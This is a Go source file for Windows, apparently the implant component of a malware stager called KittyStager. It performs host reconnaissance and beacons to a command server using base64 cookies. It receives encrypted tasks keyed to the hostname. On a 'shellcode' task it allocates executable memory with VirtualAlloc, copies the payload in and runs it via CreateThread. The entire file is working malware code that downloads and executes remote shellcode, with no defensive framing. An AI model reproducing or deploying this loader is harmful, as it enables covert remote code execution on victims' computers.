//go:build windows

package main

import (
	"KittyStager/cmd/crypto"
	"KittyStager/cmd/malwareUtil"
	"KittyStager/cmd/util"
	_ "embed"
	b64 "encoding/base64"
	"encoding/hex"
	"golang.org/x/sys/windows"
	"strconv"
	"strings"
)

//go:embed conf.txt
var t string

var (
	sleepTime int
	body      []byte
)

func main() {
	var err error
	//get the shellcode by http
	conf := strings.Split(t, ",")
	sleepTime, err = strconv.Atoi(conf[2])
	if err != nil {
		return
	}
	//initial recon
	host := malwareUtil.Recon()
	initChecks, err := util.InitUnmarshalJSON(host)
	if err != nil {
		return
	}
	cookie := b64.StdEncoding.EncodeToString(host)
	cookieName := b64.StdEncoding.EncodeToString([]byte(initChecks.GetKittenName()))
	//initial request
	// try to connect to the server
	for {
		body, err = malwareUtil.Request(cookie, conf)
		if err != nil {
			malwareUtil.Sleep(sleepTime)
		} else {
			break
		}
	}
	for {
		body, err = malwareUtil.Request(cookieName, conf)
		// if the response is not a shellcode, sleep and try again
		if len(body) < 10 {
			malwareUtil.Sleep(sleepTime)
		} else {
			key := crypto.GenerateKey(initChecks.GetHostname(), 32)
			hexSc, err := crypto.Decrypt(body, []byte(key))
			if err != nil {
				return
			}
			task, err := util.TaskUnmarshalJSON(hexSc)
			if err != nil {
				return
			}
			switch task.Tag {
			case "shellcode":
				shellcode, err := hex.DecodeString(string(task.Payload))
				if err != nil {
					return
				}
				//inject the shellcode
				inject(shellcode)
				return
			case "sleep":
				sleepTime, err = strconv.Atoi(string(task.Payload))
				if err != nil {
					return
				}
				malwareUtil.Sleep(sleepTime)
			}
		}
	}
}

func inject(shellcode []byte) {

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	createThread := kernel32.NewProc("CreateThread")

	shellcodeExec, _ := windows.VirtualAlloc(
		uintptr(0),
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE)

	malwareUtil.Memcpy(shellcodeExec, shellcode)

	var oldProtect uint32
	windows.VirtualProtect(
		shellcodeExec,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		&oldProtect)

	hThread, _, _ := createThread.Call(
		0,
		0,
		shellcodeExec,
		uintptr(0),
		0,
		0)

	windows.WaitForSingleObject(
		windows.Handle(hThread),
		windows.INFINITE)
}
